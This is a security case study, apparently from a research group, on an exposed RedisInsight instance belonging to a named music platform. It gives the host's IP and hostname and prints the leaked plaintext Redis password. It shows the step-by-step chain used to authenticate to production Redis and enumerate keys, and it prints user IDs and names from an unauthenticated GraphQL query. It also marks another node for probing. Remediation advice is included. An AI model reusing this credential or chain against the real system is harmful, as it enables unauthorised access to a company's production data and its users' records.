---
type: case-study
title: "CMS Production Redis — RedisInsight Credential Leak, Chain B"
date: 2026-05-26
severity: CRITICAL
sector: commercial
tags: [redis-stack, redisinsight, chain-b, credential-leak, CMS, production, GCP, ReJSON, redis-search, bull-queue, djaminn, social-platform]
summary: "RedisInsight 2.36.0 at port 8001 requires no authentication. GET /api/databases returns the Redis AUTH password in plaintext. AUTH confirms on port 6379. Keyspace: 154 keys, social/creative platform with campaign, push notification, ranking, and contest queues plus daily user activity counters. Last connection 48 hours before discovery."
---

# CMS Production Redis — RedisInsight Credential Leak, Chain B

**Date:** 2026-05-26
**Target:** 35.210.76.182
**Hostname:** cmsdev.djaminn.app
**ASN:** AS15169, Google LLC (GCP)
**Severity:** CRITICAL

---

## What Was Found

### F1 — RedisInsight Unauthenticated with Plaintext Credential in API Response (CRITICAL)

Port 8001 runs RedisInsight 2.36.0 with no authentication. The application type is `REDIS_STACK_WEB`. Encryption strategy is `PLAIN`. The `/api/info` endpoint confirms the build:

```
GET http://35.210.76.182:8001/api/info
→ HTTP 200, X-Powered-By: Express
{
  "appVersion": "2.36.0",
  "buildType": "REDIS_STACK_WEB",
  "encryptionStrategies": ["PLAIN"],
  "fixedDatabaseId": "redis-stack"
}
```

The `/api/databases` endpoint returns every configured connection, including stored credentials:

```
GET http://35.210.76.182:8001/api/databases
→ HTTP 200
[{
  "id": "redis-stack",
  "name": "CMS-Prod-Redis-DB",
  "host": "localhost",
  "port": 6379,
  "username": "default",
  "password": "D3v_R3dis_P4ss",
  "connectionType": "STANDALONE",
  "version": "7.2.3",
  "lastConnection": "2026-05-24T06:23:31.968Z",
  "tls": false
}]
```

The database name is `CMS-Prod-Redis-DB`. The last recorded connection was 2026-05-24T06:23:31 UTC, 48 hours before this enumeration.

RedisInsight stores connection records, including passwords, in its local state. Anyone with HTTP access to port 8001 can read that state. The `encryptionStrategies: ["PLAIN"]` field confirms passwords are not encrypted at rest.

### F2 — Chain B: Authenticated Redis Access via Leaked Credential (CRITICAL)

The password `D3v_R3dis_P4ss` authenticates to Redis on port 6379. The chain:

```
1. GET http://35.210.76.182:8001/api/databases  -> plaintext password
2. AUTH D3v_R3dis_P4ss on :6379                 -> +OK
3. Authenticated access confirmed               -> DBSIZE, SCAN, INFO
```

Step 1 requires no credential. Step 2 returned `+OK`. The password was not brute-forced or guessed. RedisInsight handed it out at the first HTTP request.

The Redis-Stack module set on this instance:

| Module | Version |
|--------|---------|
| RediSearch | 2.8.9 |
| ReJSON | 2.6.7 |
| RedisTimeSeries | 1.10.9 |
| RedisGears 2 | 2.0.14 |
| RedisBloom | 2.6.8 |

ReJSON stores JSON documents. RediSearch indexes structured data. RedisGears runs server-side scripts. These are the redis-stack of a content platform, not a cache.

### F3 — Data Class: Social Content Platform, User Activity and Campaign Data (HIGH)

DBSIZE: 154 keys in db0. 12 keys carry TTLs. Server uptime: 124 days. OS: `Linux 5.10.0-37-cloud-amd64`. Binary: `/opt/redis-stack/bin/redis-server`.

Key name sample (no values read):

```
bull:CampaignQueue:*                      marketing campaign jobs (16+ records)
bull:PushNotificationsQueue:*             push notification dispatch
bull:SCHEDULED_PN_QUEUE:*                 scheduled push notifications
bull:USER_RANKING_QUEUE:*                 user ranking computation
bull:PROJECT_RANKING_QUEUE:*              project ranking computation
bull:REGION_FEED_QUEUE:*                  regional content feed jobs
bull:CONTEST_WINNER_NOTIFICATION_QUEUE:*  contest winner notifications
bull:ELASTICSEARCH_INDEX_QUEUE:*          Elasticsearch indexing jobs
bull:CounterQueueWorker:*                 50+ counter worker records

dailyProjects      hash, daily project creation counts (Apr 26 to May 26)
newUser            hash, daily new user counts (same range)
dailyActiveUser    integer counters at values 1, 40, 100
weeklyActiveUser   integer counters at values 1, 150
monthlyActiveUser  integer counter at value 15

playlist_ids:{cuid}:true:true   playlist ID sets (CUIDs)
backup1, backup2, backup3, backup4   string type, values not read
```

Bull job schema fields on `CampaignQueue:9`: `ats`, `priority`, `name`, `delay`, `timestamp`, `data`, `returnvalue`, `opts`, `processedOn`, `atm`, `finishedOn`. The `data` field holds the job payload. Values were not read.

Users create projects. Projects are ranked by engagement within regions. Campaigns target users. Contests run with winner notifications. Push notifications deliver user-targeted content. An Elasticsearch index feeds from this Redis state. The daily time-series counters run from 2026-04-26 onward. Playlist IDs suggest audio or video content.

The key names confirm user activity metrics, campaign job records, push notification records, and engagement rankings. That is user data. Tier at key-name and schema level: HIGH.

---

## Attribution

**Platform:** GCP (Google LLC, AS15169). rDNS: `182.76.210.35.bc.googleusercontent.com`

**Operator:** djaminn.app. TLS certificate on port 443: `CN=cmsdev.djaminn.app`, issued by Let's Encrypt (E7), valid 2026-04-26 through 2026-07-25. The `cmsdev` subdomain label suggests a staging environment. The database name `CMS-Prod-Redis-DB` and the live last-connection timestamp say otherwise. The labels are in conflict.

**VisorGraph pivots confirmed:**
- Cert fingerprint: `a48e3bac9fd3bd6c00bf296f7713c42079efbcb706450d26cb492c5a3b7f3043`
- SAN: `cmsdev.djaminn.app` only (no wildcard, no additional domains in this cert)
- CT logs: domain first appeared in certificate transparency on or after 2026-04-26

**Port surface:**
- `:80`   nginx/1.18.0, 404 (no virtual host configured)
- `:443`  nginx/1.18.0, TLS, 502 Bad Gateway
- `:6379` Redis 7.2.3 (AUTH required; credential leaked by RedisInsight)
- `:8001` RedisInsight 2.36.0 (no auth)
- `:8080`, `:8443`, `:8888`, `:3000`  closed/filtered

---

## Stack Map

```
Internet
  └─ GCP (AS15169) — 35.210.76.182
       ├─ nginx/1.18.0 (:80, :443)  reverse proxy, upstream 502
       ├─ RedisInsight 2.36.0 (:8001, no auth)  <- EXPOSURE POINT
       │    └─ /api/databases -> plaintext Redis password
       └─ Redis 7.2.3 + redis-stack (:6379, AUTH required)
            ├─ RediSearch 2.8.9      full-text index
            ├─ ReJSON 2.6.7          JSON document store
            ├─ RedisTimeSeries 1.10.9
            ├─ RedisGears 2.0.14     server-side scripting
            └─ RedisBloom 2.6.8      probabilistic structures
```

---

## Chain

```
Anonymous HTTP to :8001
-> GET /api/databases (no auth, no header required)
-> password: "D3v_R3dis_P4ss" in response body
-> AUTH D3v_R3dis_P4ss on :6379
-> +OK
-> DBSIZE: 154 / SCAN: key names / INFO: server confirmed
```

One HTTP request. One credential. Full authenticated access.

---

## Impact

Anyone with network access can read the Redis AUTH password from port 8001. The credential works. Redis runs with the `default` user, which carries no ACL restrictions unless configured otherwise. Authenticated access to the `default` user means full read across all 154 keys, write access to all keys, and RedisGears execution within the Redis process.

The campaign and push notification queues hold job payloads with user IDs and targeting parameters. The project and user ranking queues drive content feeds. Write access to these structures rewrites rankings, injects campaign jobs, and modifies notification content. RedisGears is server-side scripting. It does not require a separate exploit path.

The Elasticsearch index is rebuilt from this Redis state. A write to the source keys propagates to search.

---

## Remediation

1. **Restrict RedisInsight to localhost or VPN only.** Port 8001 is public. nginx is already on this host. A localhost-only binding is a one-line config change.

2. **Rotate the Redis AUTH password.** The credential `D3v_R3dis_P4ss` is exposed. Every service using this Redis must rotate before this is closed.

3. **Enable RedisInsight application-level authentication.** RedisInsight 2.x supports a login password. It is not set here.

4. **Scope Redis ACLs.** The `default` user has no command restrictions. Application accounts should be scoped to the commands they need. RedisGears commands should be off by default.

5. **Resolve the dev/prod naming conflict.** The host is `cmsdev`. The database is `CMS-Prod`. If this is production data, it needs production controls. If it is not, it should not carry production data.

---

---

## Infrastructure Map

### Product Identity

**Djaminn BV** (Dutch company, Besloten Vennootschap). Product: "Djaminn: The Talent Platform" — a global music talent discovery and collaboration platform. Artists upload tracks, share videos, collaborate on songs, and compete in contests. Mobile-first (iOS + Android). App ID: `djmm.in`. 24 ratings, 4.7 stars. Price: free. Version 1.2.12 at time of survey.

Website: https://djaminn.com (Next.js). App Store: https://apps.apple.com/us/app/djaminn-the-talent-platform/id1634589883

Contact: hello@djaminn.com

### Subdomain Inventory (crt.sh)

| Subdomain | IP | Region | Notes |
|-----------|-----|--------|-------|
| djaminn.app | 34.36.106.50 | US (Missouri) | Main domain, Apollo GraphQL API |
| dev-api.djaminn.app | 35.187.172.141 | EU (Brussels) | Apollo GraphQL API, nginx/1.18.0, prisma-api path |
| cmsdev.djaminn.app | 35.210.76.182 | EU (Brussels) | **EXPOSURE NODE** — Redis + RedisInsight |
| cmsprod.djaminn.app | 35.210.76.182 | EU (Brussels) | Same node as cmsdev, nginx 502 |
| tha-cmsdev.djaminn.app | 34.87.179.212 | SG (Singapore) | Thailand/APAC region CMS dev |
| tha-cmsprod.djaminn.app | 34.87.179.212 | SG (Singapore) | Thailand/APAC region CMS prod |
| b2cdn.djaminn.app | 34.117.75.31 | US (Missouri) | GCS UploadServer (AccessDenied) |
| bcdn.djaminn.app | 130.211.35.50 | US (Missouri) | GCS UploadServer (AccessDenied) |

All 6 IPs are Google LLC (AS396982 or AS15169). Full GCP deployment, two regions (EU + APAC), CDN served from GCS.

### Deployment Architecture

```
djaminn.app / djaminn.com   [Next.js web frontend, GCP US]
       |
       v
GraphQL API layer
  ├─ 34.36.106.50  :443  Apollo GraphQL (production, via: 1.1 google)
  └─ 35.187.172.141 :443  Apollo GraphQL (dev-api, nginx/1.18.0)
       |                  Server path leak: /home/djaminndevelopment/djaminn-prisma-api/
       |
       v
Redis / CMS layer (EU region)
  └─ 35.210.76.182  :6379 Redis 7.2.3 + stack
                    :8001 RedisInsight 2.36.0 (UNAUTH)  <- EXPOSURE
                    :80   nginx/1.18.0 (404)
                    :443  nginx/1.18.0 (502)

APAC / Thailand region (separate node, same architecture)
  └─ 34.87.179.212  tha-cmsdev + tha-cmsprod

Media CDN
  ├─ b2cdn.djaminn.app -> GCS bucket (auth-required)
  └─ bcdn.djaminn.app  -> GCS bucket (auth-required)
```

### Server Path Disclosure

The `dev-api.djaminn.app` error stack trace exposes the server-side file path:

```
/home/djaminndevelopment/djaminn-prisma-api/node_modules/@apollo/server/src/...
```

Linux username: `djaminndevelopment`. Project directory: `djaminn-prisma-api`. This is the GraphQL API source tree running on `dev-api` at 35.187.172.141.

The main production API at 34.36.106.50 exposes a compiled path:

```
/app/node_modules/@apollo/server/dist/cjs/...
```

Containerized deployment on production (`/app`), direct filesystem on dev-api (`/home/...`).

### GraphQL API Exposure

The Apollo GraphQL API at `dev-api.djaminn.app` responds to unauthenticated introspection. The schema exposes **280 query operations** and a type system covering the full platform data model.

Key entity types confirmed by introspection: `User`, `Artist`, `Project`, `Track`, `Comment`, `Contest`, `ContestProject`, `Campaign`, `CampaignMember`, `Conversation`, `Message`, `Playlist`, `Endorsement`, `Ranking`, `PushNotification`, `Group`, `Membership`, `Recording`, `Sample`, `Genre`, `Bpm`, `Timeline`.

Unauthenticated data return confirmed — `allArtists` with no auth header returned live user records:

```json
{ "data": { "allArtists": [
  {"id": "cm14ycvfw00d2x6sc4ur2yq1o", "name": "Maria"},
  {"id": "cm14ycvfw00d4x6scemmxzmwn", "name": "Gregg"},
  {"id": "cm14ycvfw00d6x6scmwenjzed", "name": "Gabriel"}
]}}
```

Whether auth is enforced on queries carrying PII (email, phone, location) was not tested beyond the artist name/ID enumeration above. The introspection endpoint is unrestricted. The `me`, `getUserByEmail`, `getUserByArtistName`, and `getCustomUsersCsv` operations are present in the schema.

---

## Additional Findings

### F4 — GraphQL Introspection Unrestricted on Dev API (MEDIUM)

`dev-api.djaminn.app` (35.187.172.141) serves a full Apollo GraphQL API with introspection enabled and no authentication on the introspection query. 280 query operations are enumerable without any credential. The schema maps the complete platform data model: users, projects, tracks, campaigns, campaigns, contests, rankings, messaging, push notifications, and administration operations (`getCustomUsersCsv`, `getCsvUrl`, `sendPushNotificationsToUsers`).

Unauthenticated read of `allArtists` returned live user identity records (CUID + name).

The `dev-api` label does not mitigate the exposure — the API is publicly reachable and returns production-tier data.

### F5 — Server Path Disclosure via Apollo Stack Trace (LOW)

Any unauthenticated HTTP GET to `dev-api.djaminn.app` returns a 400 CSRF rejection that includes the full Apollo server stack trace. The trace reveals:

- Linux system username: `djaminndevelopment`
- Project path: `/home/djaminndevelopment/djaminn-prisma-api/`
- Framework internals at source-file depth (`.ts` paths, not compiled `.js`)

The production API at 34.36.106.50 compiles to `/app/...`, suggesting containerization. The dev-api node runs directly on the filesystem under a named Linux user, meaning it is likely a VM with SSH access tied to that account.

### F6 — APAC Region CMS Node (tha-cmsdev / tha-cmsprod) Present but Not Probed (UNRATED)

34.87.179.212 (Singapore) hosts `tha-cmsdev.djaminn.app` and `tha-cmsprod.djaminn.app`. Both subdomains resolve to the same IP. Port scan timed out without returning results during this session. The naming convention mirrors the EU node: if 35.210.76.182 runs RedisInsight on port 8001 unauthenticated, the APAC node is a candidate for the same configuration.

Surface open, access not exercised. Requires targeted port scan and probe.

---

*NuClide Research — 2026-05-26*
